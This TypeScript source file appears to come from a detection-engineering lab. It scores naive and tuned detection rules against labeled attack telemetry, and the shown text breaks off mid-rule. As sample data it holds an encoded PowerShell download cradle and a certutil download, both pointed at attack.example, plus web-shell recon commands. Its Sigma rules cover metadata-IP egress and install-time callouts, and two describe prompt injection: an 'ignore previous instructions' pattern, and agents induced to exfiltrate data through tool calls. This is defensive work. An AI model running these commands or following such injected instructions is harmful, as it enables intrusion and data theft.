// Detection Engineering lab — Sigma-style rule runner against real telemetry.
//
// Telemetry samples drawn from public incident reporting and ATT&CK technique
// references:
//   - T1078.004 Cloud Accounts (Lapsus$, Storm-0558 2023, Scattered Spider)
//   - T1059.001 PowerShell encoded command (countless ransomware affiliates)
//   - T1098.001 Additional Cloud Credentials (UNC2452 Solorigate AAD pivot)
//   - T1136.003 Create Cloud Account (Octo Tempest, BlackCat)
//   - T1110.003 Password Spraying (Midnight Blizzard against Microsoft 2024)
//   - T1190 + T1505.003 Web shell after exploitation (Volt Typhoon, Hafnium)
//
// Each scenario has a small event stream (mix of malicious + benign) and two
// detection rules: a naive one written by someone who saw the IOC once and
// stopped reading, and a tuned one that survives contact with production.
// The runner reports precision/recall against the labeled ground truth.

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface Event {
  id: string;
  /** epoch ms — monotonically increasing within a scenario */
  ts: number;
  source: "Sysmon" | "CloudTrail" | "AzureSignIn" | "Okta" | "EDR" | "AAD-Audit";
  eventId?: number | string;
  /** flattened representation of the event's interesting fields */
  fields: Record<string, string | number | boolean | undefined>;
  /** ground-truth label: is this event part of the attack? */
  malicious: boolean;
  /** Inline note shown next to the event in the UI. */
  note?: string;
}

/** A predicate against an event, expressed as a condition tree.
 *  Sigma-equivalent — the engine evaluates AND/OR over field matches. */
export type Match =
  | { type: "eq"; field: string; value: string | number | boolean }
  | { type: "contains"; field: string; value: string }
  | { type: "regex"; field: string; pattern: string; flags?: string }
  | { type: "in"; field: string; values: (string | number)[] }
  | { type: "gte"; field: string; value: number }
  | { type: "and"; clauses: Match[] }
  | { type: "or"; clauses: Match[] }
  | { type: "not"; clause: Match };

export interface Rule {
  id: string;
  title: string;
  severity: Severity;
  /** Quick prose summary. */
  description: string;
  source: Event["source"][];
  match: Match;
  /** What ATT&CK technique this rule targets. */
  attack: string[];
  reference: string;
  /** False-positive notes — what we know it lights up on. */
  knownFp?: string;
}

export interface Scenario {
  id: string;
  title: string;
  blurb: string;
  /** Real-world incident or actor this is modeled after. */
  reference: string;
  events: Event[];
  /** Two rules — a naive one and a tuned one. */
  naiveRule: Rule;
  tunedRule: Rule;
}

/* ====================================================================== *
 *  Match engine                                                          *
 * ====================================================================== */

function getField(ev: Event, field: string): unknown {
  if (field === "_source") return ev.source;
  if (field === "_eventId") return ev.eventId;
  return ev.fields[field];
}

export function evalMatch(m: Match, ev: Event): boolean {
  switch (m.type) {
    case "eq":
      return getField(ev, m.field) === m.value;
    case "contains": {
      const v = getField(ev, m.field);
      return typeof v === "string" && v.toLowerCase().includes(m.value.toLowerCase());
    }
    case "regex": {
      const v = getField(ev, m.field);
      if (typeof v !== "string") return false;
      try {
        return new RegExp(m.pattern, m.flags ?? "i").test(v);
      } catch {
        return false;
      }
    }
    case "in": {
      const v = getField(ev, m.field);
      return m.values.includes(v as string | number);
    }
    case "gte": {
      const v = getField(ev, m.field);
      return typeof v === "number" && v >= m.value;
    }
    case "and":
      return m.clauses.every((c) => evalMatch(c, ev));
    case "or":
      return m.clauses.some((c) => evalMatch(c, ev));
    case "not":
      return !evalMatch(m.clause, ev);
  }
}

export interface RuleResult {
  matchedIds: string[];
  truePositive: number;
  falsePositive: number;
  falseNegative: number;
  trueNegative: number;
  precision: number;
  recall: number;
  f1: number;
}

export function runRule(rule: Rule, events: Event[]): RuleResult {
  const matchedIds: string[] = [];
  let tp = 0;
  let fp = 0;
  let fn = 0;
  let tn = 0;
  for (const ev of events) {
    const eligible = rule.source.includes(ev.source);
    const fired = eligible && evalMatch(rule.match, ev);
    if (fired) matchedIds.push(ev.id);
    if (fired && ev.malicious) tp += 1;
    else if (fired && !ev.malicious) fp += 1;
    else if (!fired && ev.malicious) fn += 1;
    else tn += 1;
  }
  const precision = tp + fp === 0 ? 0 : tp / (tp + fp);
  const recall = tp + fn === 0 ? 0 : tp / (tp + fn);
  const f1 = precision + recall === 0 ? 0 : (2 * precision * recall) / (precision + recall);
  return { matchedIds, truePositive: tp, falsePositive: fp, falseNegative: fn, trueNegative: tn, precision, recall, f1 };
}

/* ====================================================================== *
 *  Scenarios                                                              *
 * ====================================================================== */

const T = (s: string) => new Date(s).getTime();

export const SCENARIOS: Scenario[] = [
  /* ------------------------------------------------------------------- *
   *  1. PowerShell encoded command — T1059.001                          *
   * ------------------------------------------------------------------- */
  {
    id: "powershell-encoded",
    title: "PowerShell encoded command (T1059.001)",
    blurb:
      "An attacker drops a base64-encoded PowerShell payload via -EncodedCommand. The naive rule fires on every -enc usage; the tuned rule weights long base64 + suspicious decoded markers.",
    reference:
      "Microsoft Threat Intelligence — observed across Conti, BlackCat, and most ransomware affiliates 2020-2024.",
    events: [
      {
        id: "ps-1",
        ts: T("2025-03-12T09:14:22Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          CommandLine:
            "powershell.exe -NoP -W Hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQAxACcAKQA=",
          ParentImage: "C:\\Windows\\System32\\winword.exe",
          User: "DESKTOP-Q9X\\jdoe",
        },
        malicious: true,
        note: "decoded: IEX (new-object net.webclient).downloadstring('http://attack.example/stage1')",
      },
      {
        id: "ps-2",
        ts: T("2025-03-12T09:14:25Z"),
        source: "Sysmon",
        eventId: 3,
        fields: {
          Image: "powershell.exe",
          DestinationIp: "203.0.113.42",
          DestinationPort: 80,
          User: "DESKTOP-Q9X\\jdoe",
        },
        malicious: true,
        note: "outbound to attacker stager",
      },
      {
        id: "ps-3",
        ts: T("2025-03-12T09:30:01Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "powershell.exe",
          CommandLine:
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Program Files\\Acme\\update.ps1",
          ParentImage: "C:\\Program Files\\Acme\\AcmeUpdater.exe",
          User: "NT AUTHORITY\\SYSTEM",
        },
        malicious: false,
        note: "legitimate signed updater",
      },
      {
        id: "ps-4",
        ts: T("2025-03-12T10:02:11Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "powershell.exe",
          CommandLine:
            "powershell.exe -enc dABlAHMAdAAxADIAMwA=",
          ParentImage: "explorer.exe",
          User: "CORP\\helpdesk",
        },
        malicious: false,
        note: "support engineer testing — decoded: 'test123'",
      },
    ],
    naiveRule: {
      id: "DE.PS.NAIVE",
      title: "powershell -enc anywhere",
      severity: "high",
      description:
        "Fires on any PowerShell command line containing -enc / -EncodedCommand. Catches the bad guys but also catches every helpdesk runbook.",
      source: ["Sysmon"],
      attack: ["T1059.001"],
      reference: "https://attack.mitre.org/techniques/T1059/001/",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "CommandLine", pattern: "(?:^|\\s)-(?:enc|encodedcommand)\\b", flags: "i" },
        ],
      },
    },
    tunedRule: {
      id: "DE.PS.TUNED",
      title: "powershell -enc with long payload from Office or browser",
      severity: "high",
      description:
        "Requires -enc plus a long base64 payload (≥100 chars) AND a parent process that should never spawn powershell (winword, excel, outlook, browsers). Cuts FP from helpdesk runbooks while keeping coverage of the macro-borne loader.",
      source: ["Sysmon"],
      attack: ["T1059.001", "T1566.001"],
      reference:
        "Florian Roth, sigma-rules/win_susp_powershell_enc_cmd.yml + Red Canary Threat Detection 2024.",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "CommandLine", pattern: "-(?:enc|encodedcommand)\\s+[A-Za-z0-9+/=]{100,}", flags: "i" },
          {
            type: "regex",
            field: "ParentImage",
            pattern: "\\\\(winword|excel|outlook|powerpnt|chrome|msedge|firefox|teams)\\.exe$",
            flags: "i",
          },
        ],
      },
      knownFp: "Penetration testers using the same TTP for authorized assessments.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  2. Cloud password spraying — T1110.003                             *
   * ------------------------------------------------------------------- */
  {
    id: "password-spray",
    title: "Microsoft 365 password spray (T1110.003)",
    blurb:
      "Hundreds of failed sign-ins from one IP across many users, then a single success. Naive rule alerts on any failed sign-in; tuned rule looks for high-cardinality user spread + a success in the same window.",
    reference:
      "Microsoft, 'Midnight Blizzard: Russian threat actor compromised corporate email' (Jan 2024). Same TTP: a low-volume spray hit a legacy non-MFA test tenant.",
    events: (() => {
      const evs: Event[] = [];
      // Spray: 1 IP, 12 users, all fail
      for (let i = 0; i < 12; i++) {
        evs.push({
          id: `sp-fail-${i}`,
          ts: T("2025-03-08T03:11:00Z") + i * 4000,
          source: "AzureSignIn",
          eventId: "1",
          fields: {
            UserPrincipalName: `user${i}@contoso.com`,
            IpAddress: "185.220.101.42",
            Status: "Failure",
            ErrorCode: 50126,
            UserAgent: "BAV2ROPC",
            ResultType: "InvalidUserNameOrPassword",
            Application: "Office 365 Exchange Online",
          },
          malicious: true,
        });
      }
      // The hit
      evs.push({
        id: "sp-hit",
        ts: T("2025-03-08T03:11:55Z"),
        source: "AzureSignIn",
        fields: {
          UserPrincipalName: "svc-legacy@contoso.com",
          IpAddress: "185.220.101.42",
          Status: "Success",
          ErrorCode: 0,
          UserAgent: "BAV2ROPC",
          Application: "Office 365 Exchange Online",
          MfaRequired: false,
        },
        malicious: true,
        note: "the success — legacy service account, no MFA",
      });
      // Benign helpdesk failures from one IP, single user
      evs.push({
        id: "sp-benign-1",
        ts: T("2025-03-08T09:00:00Z"),
        source: "AzureSignIn",
        fields: {
          UserPrincipalName: "alice@contoso.com",
          IpAddress: "203.0.113.7",
          Status: "Failure",
          ErrorCode: 50126,
          UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
          Application: "Office 365 SharePoint Online",
        },
        malicious: false,
        note: "Alice fat-fingered her password",
      });
      return evs;
    })(),
    naiveRule: {
      id: "DE.SPRAY.NAIVE",
      title: "Any failed Entra sign-in",
      severity: "low",
      description:
        "Fires on every Failure status. Floods the SOC.",
      source: ["AzureSignIn"],
      attack: ["T1110"],
      reference: "https://attack.mitre.org/techniques/T1110/003/",
      match: {
        type: "eq",
        field: "Status",
        value: "Failure",
      },
    },
    tunedRule: {
      id: "DE.SPRAY.TUNED",
      title: "Sign-in from BAV2ROPC user-agent (legacy auth) with bad-password failure",
      severity: "high",
      description:
        "Targets the legacy auth user-agent BAV2ROPC + InvalidUserNameOrPassword. This UA is the canonical signature of password-spray tooling against Exchange Online basic auth. Matches the spray fails and the spray hit, ignores Alice's typo.",
      source: ["AzureSignIn"],
      attack: ["T1110.003", "T1078.004"],
      reference:
        "https://www.microsoft.com/security/blog/2024/01/19/midnight-blizzard-guidance-for-responders-on-nation-state-attack/",
      match: {
        type: "or",
        clauses: [
          {
            type: "and",
            clauses: [
              { type: "eq", field: "UserAgent", value: "BAV2ROPC" },
              { type: "eq", field: "ResultType", value: "InvalidUserNameOrPassword" },
            ],
          },
          {
            type: "and",
            clauses: [
              { type: "eq", field: "UserAgent", value: "BAV2ROPC" },
              { type: "eq", field: "Status", value: "Success" },
            ],
          },
        ],
      },
      knownFp: "Legacy applications that haven't been migrated off basic auth — should be ringfenced or disabled, not exempted from detection.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  3. Add-credential to Service Principal — T1098.001                 *
   * ------------------------------------------------------------------- */
  {
    id: "sp-add-credential",
    title: "Service Principal credential added (T1098.001)",
    blurb:
      "Attacker abuses Application.ReadWrite.All to add a client-secret to a privileged Service Principal. Naive rule alerts on every credential change; tuned rule watches for additions to apps holding directory-write or app-role-assignment grants.",
    reference:
      "MSRC, 'Storm-0558 token-forging activity' July 2023. Also Solorigate (UNC2452) AAD pivot — adding credentials to existing apps to evade application-allow lists.",
    events: [
      {
        id: "sp-1",
        ts: T("2025-04-02T11:14:00Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update application – Certificates and secrets management",
          TargetAppId: "fb9c1a8e-...-graph-writer-app",
          TargetAppDisplayName: "CorporateBackend",
          AddedCredentialType: "Password",
          ActorUpn: "compromised.user@contoso.com",
          ActorIp: "185.220.101.42",
        },
        malicious: true,
        note: "attacker adds secret to Graph-writer-grade app",
      },
      {
        id: "sp-2",
        ts: T("2025-04-02T11:14:30Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update service principal",
          TargetAppDisplayName: "CorporateBackend",
          NewSecretValidity: "2 years",
          ActorUpn: "compromised.user@contoso.com",
        },
        malicious: true,
      },
      {
        id: "sp-3",
        ts: T("2025-04-02T15:00:00Z"),
        source: "AAD-Audit",
        fields: {
          Operation: "Update application – Certificates and secrets management",
          TargetAppId: "low-priv-app-id",
          TargetAppDisplayName: "PrintQuotaTracker",
          AddedCredentialType: "Password",
          ActorUpn: "platform-eng@contoso.com",
          ActorIp: "10.20.30.40",
        },
        malicious: false,
        note: "scheduled rotation of low-privileged app",
      },
    ],
    naiveRule: {
      id: "DE.SP.NAIVE",
      title: "Any application credential update",
      severity: "low",
      description:
        "Fires on every cert/secret update. With 200 apps in a tenant and quarterly rotations, drowns analysts.",
      source: ["AAD-Audit"],
      attack: ["T1098.001"],
      reference: "https://attack.mitre.org/techniques/T1098/001/",
      match: {
        type: "contains",
        field: "Operation",
        value: "Certificates and secrets management",
      },
    },
    tunedRule: {
      id: "DE.SP.TUNED",
      title: "Credential added to a Graph-writer / privileged-named app",
      severity: "critical",
      description:
        "Filter to credential additions targeting apps whose display name contains 'graph', 'admin', 'corporate', 'backend' OR by an actor IP outside the corp egress range. Aligns with how Storm-0558 extended persistence.",
      source: ["AAD-Audit"],
      attack: ["T1098.001", "T1078.004"],
      reference:
        "Andy Robbins (SpecterOps), 'Azure Privilege Escalation via Service Principal Abuse'.",
      match: {
        type: "and",
        clauses: [
          { type: "contains", field: "Operation", value: "Certificates and secrets management" },
          {
            type: "or",
            clauses: [
              { type: "regex", field: "TargetAppDisplayName", pattern: "graph|admin|corporate|backend|root", flags: "i" },
              { type: "not", clause: { type: "regex", field: "ActorIp", pattern: "^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2\\d|3[01])\\." } },
            ],
          },
        ],
      },
      knownFp: "Out-of-band rotations performed by SREs on a coffee-shop network — pair with a legitimate change-management ticket reference.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  4. CloudTrail — IAM user creation by automation                    *
   * ------------------------------------------------------------------- */
  {
    id: "iam-create-user",
    title: "CloudTrail: IAM user created (T1136.003)",
    blurb:
      "Attacker mints a new IAM user with admin policy attached. Naive rule alerts on every CreateUser; tuned rule looks for CreateUser → AttachUserPolicy(AdministratorAccess) within seconds, by an unusual principal.",
    reference:
      "Mandiant, 'UNC2452 / SUNBURST cloud-pivot post-exploitation' — also the playbook of LAPSUS$ and BlackCat affiliates.",
    events: [
      {
        id: "ct-1",
        ts: T("2025-05-19T14:01:00Z"),
        source: "CloudTrail",
        fields: {
          eventName: "CreateUser",
          userIdentity_type: "AssumedRole",
          userIdentity_arn: "arn:aws:sts::1234:assumed-role/LambdaDeployer/abc",
          requestParameters_userName: "ops-bot-2",
          sourceIpAddress: "203.0.113.99",
          userAgent: "aws-cli/2.15.0",
          awsRegion: "us-east-1",
        },
        malicious: true,
      },
      {
        id: "ct-2",
        ts: T("2025-05-19T14:01:08Z"),
        source: "CloudTrail",
        fields: {
          eventName: "AttachUserPolicy",
          userIdentity_arn: "arn:aws:sts::1234:assumed-role/LambdaDeployer/abc",
          requestParameters_userName: "ops-bot-2",
          requestParameters_policyArn: "arn:aws:iam::aws:policy/AdministratorAccess",
          sourceIpAddress: "203.0.113.99",
          awsRegion: "us-east-1",
        },
        malicious: true,
        note: "the privesc — admin attached 8 seconds after CreateUser",
      },
      {
        id: "ct-3",
        ts: T("2025-05-20T10:00:00Z"),
        source: "CloudTrail",
        fields: {
          eventName: "CreateUser",
          userIdentity_arn: "arn:aws:iam::1234:user/hr-onboarding",
          requestParameters_userName: "new-hire-2025-093",
          sourceIpAddress: "10.20.30.40",
          userAgent: "Boto3/1.34",
          awsRegion: "us-east-1",
        },
        malicious: false,
        note: "scripted onboarding from corporate range",
      },
    ],
    naiveRule: {
      id: "DE.IAM.NAIVE",
      title: "CloudTrail eventName == CreateUser",
      severity: "low",
      description: "Every IAM user creation. In an account that uses scripted onboarding, this is alert-spam.",
      source: ["CloudTrail"],
      attack: ["T1136.003"],
      reference: "https://attack.mitre.org/techniques/T1136/003/",
      match: { type: "eq", field: "eventName", value: "CreateUser" },
    },
    tunedRule: {
      id: "DE.IAM.TUNED",
      title: "CreateUser OR AttachUserPolicy(AdministratorAccess) — externalized",
      severity: "critical",
      description:
        "Two clauses joined by OR: (a) CreateUser whose source IP is outside the corp range, (b) AttachUserPolicy where the policy ARN is AdministratorAccess. Either is interesting, both within seconds is the canonical IAM persistence pattern.",
      source: ["CloudTrail"],
      attack: ["T1136.003", "T1098.001"],
      reference:
        "https://github.com/RhinoSecurityLabs/cloudgoat — the iam_privesc_by_attachment scenario.",
      match: {
        type: "or",
        clauses: [
          {
            type: "and",
            clauses: [
              { type: "eq", field: "eventName", value: "AttachUserPolicy" },
              { type: "contains", field: "requestParameters_policyArn", value: "AdministratorAccess" },
            ],
          },
          {
            type: "and",
            clauses: [
              { type: "eq", field: "eventName", value: "CreateUser" },
              { type: "not", clause: { type: "regex", field: "sourceIpAddress", pattern: "^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2\\d|3[01])\\." } },
            ],
          },
        ],
      },
      knownFp: "Break-glass procedures — should be rare, ticketed, and timed.",
    },
  },

  /* ------------------------------------------------------------------- *
   *  5. Web shell drop after exploitation — T1505.003                   *
   * ------------------------------------------------------------------- */
  {
    id: "webshell-drop",
    title: "Web-server process spawns shell (T1505.003)",
    blurb:
      "After exploiting a web-app vulnerability, the attacker drops a web-shell that uses the parent w3wp.exe / java / python process to spawn cmd.exe. Naive rule looks for cmd.exe creation; tuned rule conditions on web-server parent.",
    reference:
      "CISA AA22-074A 'Volt Typhoon' + Hafnium Exchange ProxyLogon (CVE-2021-26855) — w3wp.exe → cmd.exe → certutil download is the canonical shape.",
    events: [
      {
        id: "ws-1",
        ts: T("2025-06-04T22:18:00Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\cmd.exe",
          ParentImage: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
          CommandLine:
            "cmd.exe /c whoami && net group \"domain admins\" /domain",
          User: "IIS APPPOOL\\OWA",
        },
        malicious: true,
        note: "shell from IIS worker process",
      },
      {
        id: "ws-2",
        ts: T("2025-06-04T22:18:20Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\certutil.exe",
          ParentImage: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
          CommandLine:
            "certutil.exe -urlcache -split -f http://attack.example/t.exe C:\\Windows\\Temp\\t.exe",
          User: "IIS APPPOOL\\OWA",
        },
        malicious: true,
        note: "LOLBin download via certutil",
      },
      {
        id: "ws-3",
        ts: T("2025-06-05T08:00:00Z"),
        source: "Sysmon",
        eventId: 1,
        fields: {
          Image: "C:\\Windows\\System32\\cmd.exe",
          ParentImage: "C:\\Program Files\\Microsoft VS Code\\Code.exe",
          CommandLine: "cmd.exe /c npm test",
          User: "CORP\\eng",
        },
        malicious: false,
        note: "developer running tests",
      },
    ],
    naiveRule: {
      id: "DE.WS.NAIVE",
      title: "Any cmd.exe process creation",
      severity: "low",
      description:
        "cmd.exe spawns thousands of times per day on a typical workstation fleet.",
      source: ["Sysmon"],
      attack: ["T1059.003"],
      reference: "https://attack.mitre.org/techniques/T1059/003/",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          { type: "regex", field: "Image", pattern: "\\\\cmd\\.exe$", flags: "i" },
        ],
      },
    },
    tunedRule: {
      id: "DE.WS.TUNED",
      title: "Web-server process spawns shell or LOLBin",
      severity: "critical",
      description:
        "Conditions on the parent process being a web-server worker (w3wp, java, python, php-cgi, node when running as service) AND the child being cmd/powershell/certutil/bitsadmin. This is the canonical web-shell signature.",
      source: ["Sysmon"],
      attack: ["T1505.003", "T1059", "T1105"],
      reference:
        "CISA AA22-074A 'Volt Typhoon LOTL' + Florian Roth sigma proc_creation_win_susp_iis_child_process.yml.",
      match: {
        type: "and",
        clauses: [
          { type: "eq", field: "_eventId", value: 1 },
          {
            type: "regex",
            field: "ParentImage",
            pattern: "\\\\(w3wp|java|python|php-cgi|httpd|nginx|tomcat)\\.exe$",
            flags: "i",
          },
          {
            type: "regex",
            field: "Image",
            pattern: "\\\\(cmd|powershell|certutil|bitsadmin|wscript|cscript|mshta|rundll32)\\.exe$",
            flags: "i",
          },
        ],
      },
      knownFp: "ColdFusion / SharePoint admin tools that legitimately shell out — allowlist by command-line shape.",
    },
  },
];

/* ====================================================================== *
 *  Lab-aligned detection ruleset (T-04)                                  *
 *                                                                        *
 *  One catalog row per lab domain, intended as Sigma-equivalent          *
 *  starting points the reader can lift into their SIEM. Rationale +      *
 *  suggested data source per rule, plus a published reference.           *
 * ====================================================================== */

export type LabKey =
  | "csp"
  | "jwt"
  | "ssrf"
  | "iam"
  | "supply-chain"
  | "rag"
  | "prompt-injection"
  | "agent-identity";

export interface LabRule {
  id: string;
  lab: LabKey;
  title: string;
  severity: Severity;
  rationale: string;
  dataSource: string;
  attack: string;
  sigma: string;
  reference: string;
  knownFp?: string;
}

export const LAB_RULES: LabRule[] = [
  {
    id: "DE.CSP.REPORT.SCRIPT-SRC",
    lab: "csp",
    title: "CSP report-only violation: script-src blocks third-party",
    severity: "medium",
    rationale:
      "When report-only violations spike against script-src, you're either watching an XSS attempt or a forgotten vendor tag. Either way, you need eyes on it before promoting the policy from report-only to enforce.",
    dataSource:
      "Application logs of the /csp-report endpoint (or the CSP reports collector you've wired up). Web Application Firewall if it ingests CSP reports.",
    attack: "OWASP A03:2021 Injection / CWE-79",
    sigma: [
      "title: CSP script-src violation spike",
      "logsource:",
      "  product: web",
      "  service: csp-reports",
      "detection:",
      "  selection:",
      "    csp-report.violated-directive|startswith: 'script-src'",
      "    csp-report.blocked-uri|re: '^https?://'",
      "  count_over_5m: 25",
      "  condition: selection",
    ].join("\n"),
    reference:
      "https://www.w3.org/TR/CSP3/#violation — and Mozilla's blog on rolling out CSP report-only at scale",
    knownFp:
      "Browser extensions that inject content. Filter on blocked-uri host before alerting.",
  },
  {
    id: "DE.JWT.ALG.NONE",
    lab: "jwt",
    title: "JWT presented with alg=none or alg switch (HS\u2194RS)",
    severity: "critical",
    rationale:
      "alg=none is CVE-2015-9235; verifier downgrade RS\u2192HS is CVE-2016-10555. If a token with header.alg='none' or a token whose alg differs from the issuer's published JWKS reaches the resource server, the verifier is misconfigured.",
    dataSource:
      "API gateway access logs that decode and log the JWT header (Kong, Envoy ext_authz, AWS API Gateway custom authorizer, Azure APIM). Application logs that emit auth.alg.",
    attack: "CWE-347 / CVE-2015-9235 / CVE-2016-10555",
    sigma: [
      "title: JWT with alg=none or unexpected alg",
      "logsource:",
      "  product: api-gateway",
      "  service: auth",
      "detection:",
      "  none:",
      "    auth.jwt.alg: 'none'",
      "  drift:",
      "    auth.jwt.alg|not_in: [RS256, ES256, EdDSA]",
      "  condition: none or drift",
    ].join("\n"),
    reference:
      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
    knownFp:
      "Internal services that genuinely use HS256 with a shared secret \u2014 maintain a per-issuer alg allowlist instead of one global list.",
  },
  {
    id: "DE.SSRF.METADATA.EGRESS",
    lab: "ssrf",
    title: "Outbound request from app subnet to cloud metadata IPs",
    severity: "critical",
    rationale:
      "Capital One (2019) was AWS IMDSv1 SSRF. Any outbound from your app tier to 169.254.169.254 (AWS/Azure), 100.100.100.200 (Aliyun), or fd00:ec2::254 (AWS IPv6 metadata) is exfil-class unless explicitly whitelisted.",
    dataSource:
      "VPC Flow Logs, Azure NSG Flow Logs, GCP VPC Flow Logs, or eBPF egress telemetry (Cilium Hubble, Tetragon). Any place you can see srcip\u2192dstip per process.",
    attack: "MITRE ATT&CK T1552.005 (Cloud Instance Metadata API)",
    sigma: [
      "title: Outbound to cloud instance metadata service",
      "logsource:",
      "  product: vpc-flow-logs",
      "detection:",
      "  selection:",
      "    dst.ip|in:",
      "      - 169.254.169.254",
      "      - 100.100.100.200",
      "      - fd00:ec2::254",
      "    src.subnet|not_in: ['allowed-imds-egress-subnets']",
      "  condition: selection",
    ].join("\n"),
    reference:
      "https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/ \u2014 and the AWS IMDSv2 hardening guide",
    knownFp:
      "Sidecars / daemonsets that legitimately query IMDS (kube2iam, IRSA agents). Pin the source identity to those workloads.",
  },
  {
    id: "DE.IAM.PRIVESC.PASSROLE",
    lab: "iam",
    title: "iam:PassRole granted with Resource: '*'",
    severity: "high",
    rationale:
      "Rhino Security's canonical AWS privesc list \u2014 iam:PassRole + lambda:CreateFunction (or ec2:RunInstances, glue:CreateDevEndpoint, etc.) on '*' lets an attacker assume any role the account holds. Watch for both the policy attachment and the post-attachment exercise.",
    dataSource:
      "AWS CloudTrail (PutUserPolicy, AttachRolePolicy, CreatePolicyVersion). For Azure: Microsoft Graph audit logs on directoryRoleAssignment. For GCP: Cloud Audit Logs on iam.serviceAccounts.actAs grants.",
    attack:
      "MITRE ATT&CK T1078.004 (Cloud Accounts) / Rhino Security AWS-PassRole",
    sigma: [
      "title: IAM policy attached granting iam:PassRole on '*'",
      "logsource:",
      "  product: aws-cloudtrail",
      "detection:",
      "  selection:",
      "    eventSource: 'iam.amazonaws.com'",
      "    eventName|in: [PutUserPolicy, PutRolePolicy, AttachRolePolicy, CreatePolicyVersion]",
      "    requestParameters.policyDocument|contains: '\\\"iam:PassRole\\\"'",
      "    requestParameters.policyDocument|contains: '\\\"Resource\\\": \\\"*\\\"'",
      "  condition: selection",
    ].join("\n"),
    reference:
      "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
    knownFp:
      "Bootstrap policies in landing-zone tooling (ControlTower, Terraform Cloud) on first apply. Suppress per-pipeline.",
  },
  {
    id: "DE.SUPPLYCHAIN.POSTINSTALL.NETWORK",
    lab: "supply-chain",
    title: "npm/PyPI postinstall reaches outbound network during CI",
    severity: "high",
    rationale:
      "event-stream (2018), ua-parser-js (2021), node-ipc (2022), and the 2024 XZ Utils backdoor all executed code at install time and called home or staged a payload. Detect it by watching the lifecycle script's network behaviour, not the package name.",
    dataSource:
      "CI runner sandbox telemetry (GitHub Actions ephemeral runner with --network=hostNS, Falco on self-hosted, eBPF egress on builders). For pip: --no-build-isolation makes this easier to gate.",
    attack: "MITRE ATT&CK T1195.002 (Compromise Software Supply Chain)",
    sigma: [
      "title: Lifecycle script makes outbound connection during install",
      "logsource:",
      "  product: ci-runner",
      "  service: install-step",
      "detection:",
      "  selection:",
      "    process.parent|re: '(npm|yarn|pnpm|pip|setup\\.py)'",
      "    process.lifecycle|in: [preinstall, install, postinstall]",
      "    network.direction: outbound",
      "    network.dst.ip|not_in: ['npm-registry-cidrs', 'pypi-cidrs', 'github-cdn-cidrs']",
      "  condition: selection",
    ].join("\n"),
    reference:
      "https://blog.sonatype.com/event-stream-incident \u2014 and the CISA SBOM guidance",
    knownFp:
      "Packages that legitimately fetch native binaries (node-sass, esbuild). Maintain an allowlist of known download hosts per dep.",
  },
  {
    id: "DE.RAG.POISONED.DOC",
    lab: "rag",
    title: "Indexed document contains imperative override / tool-call",
    severity: "medium",
    rationale:
      "Indirect prompt injection lands in your KB before it lands in your model. Scan documents at index time for patterns the agent will treat as instructions: 'ignore previous instructions', tool-call markup, hidden white-on-white text, base64-wrapped imperatives.",
    dataSource:
      "Pre-index document scanner (your ingestion pipeline). Logs from your vector DB ingestion job (Pinecone, Azure AI Search, pgvector). Adjacent: outbound DLP on what the agent posts.",
    attack: "OWASP LLM01 (Prompt Injection \u2014 indirect)",
    sigma: [
      "title: Indexed RAG document contains injection markers",
      "logsource:",
      "  service: rag-ingest",
      "detection:",
      "  imperatives:",
      "    body|re: '(?i)ignore (the )?(previous|prior|all) instructions?'",
      "  tool_call:",
      "    body|contains:",
      "      - '<tool_call'",
      "      - '\\\"name\\\": \\\"send_email\\\"'",
      "  hidden:",
      "    body|re: 'color\\s*:\\s*#?fff(fff)?\\b'",
      "  condition: imperatives or tool_call or hidden",
    ].join("\n"),
    reference:
      "Greshake et al. 2023 \u2014 'Not what you've signed up for: indirect prompt injection on integrated LLM applications'",
    knownFp:
      "Security training docs that quote injection examples \u2014 tag them at ingest and exempt by collection.",
  },
  {
    id: "DE.PROMPT.TOOL.EXFIL",
    lab: "prompt-injection",
    title: "Agent invokes send_email / web_fetch outside allowlist",
    severity: "high",
    rationale:
      "BlackHat 2024 (Bargury) and Embracethered's Copilot disclosures show data-exfil follows a stable pattern: model is induced (via injected content) to call a tool with attacker-controlled arguments. Alert when the tool target falls outside the per-tenant allowlist.",
    dataSource:
      "Agent runtime tool-call telemetry (LangSmith, OpenTelemetry GenAI semantics, your own tool-router log). Egress proxy logs for web_fetch.",
    attack: "OWASP LLM01 + LLM02 (Insecure Output Handling)",
    sigma: [
      "title: Agent tool-call to non-allowlisted destination",
      "logsource:",
      "  service: agent-runtime",
      "detection:",
      "  email_exfil:",
      "    tool.name: send_email",
      "    tool.args.to|not_endswith: ['@example.com']",
      "  web_exfil:",
      "    tool.name: web_fetch",
      "    tool.args.url|not_re: '^https?://(docs|api)\\.example\\.com/'",
